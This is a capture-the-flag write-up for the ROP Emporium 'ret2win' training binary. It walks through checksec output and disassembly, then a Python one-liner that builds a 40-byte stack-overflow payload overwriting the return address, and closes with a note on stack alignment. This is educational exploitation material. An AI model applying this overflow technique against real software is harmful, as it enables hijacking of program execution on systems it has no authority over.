# ret2win

In this challenge we are provided with a binary called `ret2win` and a `flag.txt` file.
Our goal is to get the `flag.txt` text using the binary.

## Step 1: Examine the binary
```bash
ilias@USER-PC:/mnt/c/Users/ilias/Desktop/CTFs/ret2win$ checksec --file=./ret2win
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0      3./ret2win
```
No PIE or Stack canary so we can just examine it with `objdump`:
```bash
ilias@USER-PC:/mnt/c/Users/ilias/Desktop/CTFs/ret2win$ objdump -d ret2win

ret2win:     file format elf64-x86-64


Disassembly of section .init:

----REMOVED FOR THE WRITE-UP----

0000000000400697 <main>:
  400697:       55                      push   %rbp
  400698:       48 89 e5                mov    %rsp,%rbp
  40069b:       48 8b 05 b6 09 20 00    mov    0x2009b6(%rip),%rax        # 601058 <stdout@GLIBC_2.2.5>
  4006a2:       b9 00 00 00 00          mov    $0x0,%ecx
  4006a7:       ba 02 00 00 00          mov    $0x2,%edx
  4006ac:       be 00 00 00 00          mov    $0x0,%esi
  4006b1:       48 89 c7                mov    %rax,%rdi
  4006b4:       e8 e7 fe ff ff          call   4005a0 <setvbuf@plt>
  4006b9:       bf 08 08 40 00          mov    $0x400808,%edi
  4006be:       e8 8d fe ff ff          call   400550 <puts@plt>
  4006c3:       bf 20 08 40 00          mov    $0x400820,%edi
  4006c8:       e8 83 fe ff ff          call   400550 <puts@plt>
  4006cd:       b8 00 00 00 00          mov    $0x0,%eax
  4006d2:       e8 11 00 00 00          call   4006e8 <pwnme>
  4006d7:       bf 28 08 40 00          mov    $0x400828,%edi
  4006dc:       e8 6f fe ff ff          call   400550 <puts@plt>
  4006e1:       b8 00 00 00 00          mov    $0x0,%eax
  4006e6:       5d                      pop    %rbp
  4006e7:       c3                      ret

00000000004006e8 <pwnme>:
  4006e8:       55                      push   %rbp
  4006e9:       48 89 e5                mov    %rsp,%rbp
  4006ec:       48 83 ec 20             sub    $0x20,%rsp
  4006f0:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  4006f4:       ba 20 00 00 00          mov    $0x20,%edx
  4006f9:       be 00 00 00 00          mov    $0x0,%esi
  4006fe:       48 89 c7                mov    %rax,%rdi
  400701:       e8 7a fe ff ff          call   400580 <memset@plt>
  400706:       bf 38 08 40 00          mov    $0x400838,%edi
  40070b:       e8 40 fe ff ff          call   400550 <puts@plt>
  400710:       bf 98 08 40 00          mov    $0x400898,%edi
  400715:       e8 36 fe ff ff          call   400550 <puts@plt>
  40071a:       bf b8 08 40 00          mov    $0x4008b8,%edi
  40071f:       e8 2c fe ff ff          call   400550 <puts@plt>
  400724:       bf 18 09 40 00          mov    $0x400918,%edi
  400729:       b8 00 00 00 00          mov    $0x0,%eax
  40072e:       e8 3d fe ff ff          call   400570 <printf@plt>
  400733:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  400737:       ba 38 00 00 00          mov    $0x38,%edx
  40073c:       48 89 c6                mov    %rax,%rsi
  40073f:       bf 00 00 00 00          mov    $0x0,%edi
  400744:       e8 47 fe ff ff          call   400590 <read@plt>
  400749:       bf 1b 09 40 00          mov    $0x40091b,%edi
  40074e:       e8 fd fd ff ff          call   400550 <puts@plt>
  400753:       90                      nop
  400754:       c9                      leave
  400755:       c3                      ret

0000000000400756 <ret2win>:
  400756:       55                      push   %rbp
  400757:       48 89 e5                mov    %rsp,%rbp
  40075a:       bf 26 09 40 00          mov    $0x400926,%edi
  40075f:       e8 ec fd ff ff          call   400550 <puts@plt>
  400764:       bf 43 09 40 00          mov    $0x400943,%edi
  400769:       e8 f2 fd ff ff          call   400560 <system@plt>
  40076e:       90                      nop
  40076f:       5d                      pop    %rbp
  400770:       c3                      ret
  400771:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  400778:       00 00 00
  40077b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

----REMOVE----
```

As we can in the main we call the function `pwnme` : `call   4006e8 <pwnme>` 
Examining `pwnme` we can see the that the stack is 32 bytes (`sub    $0x20,%rsp`) + 8 (`push   %rbp`) = 40 and we need 8 more bytes
to overwrite the return address to redirect execution to `ret2win` that prints the `flag.txt` file.

## Step 2: Crafting the payload

```bash
ilias@USER-PC:/mnt/c/Users/ilias/Desktop/CTFs/ret2win$ python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*40 + struct.
pack("<Q", 0x400757))' > input
```

Then we just use it:
```bash
ilias@USER-PC:/mnt/c/Users/ilias/Desktop/CTFs/ret2win$ ./ret2win < input
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

## Information

Why didn't I use the `0x400756` ? 
Let's look at what happens when we use that address instead of `0x400757` :
```bash
ilias@USER-PC:/mnt/c/Users/ilias/Desktop/CTFs/ret2win$ python3 -c 'import sys, struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q", 0x400756))' > input
ilias@USER-PC:/mnt/c/Users/ilias/Desktop/CTFs/ret2win$ ./ret2win < input
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
Segmentation fault (core dumped)
```

When the time comes for our flag to be printed we get `Segmentation fault (core dumped)`.
That happens cause the command at the start of our `ret2win` function is `push   %rbp` causing stack misalignment!

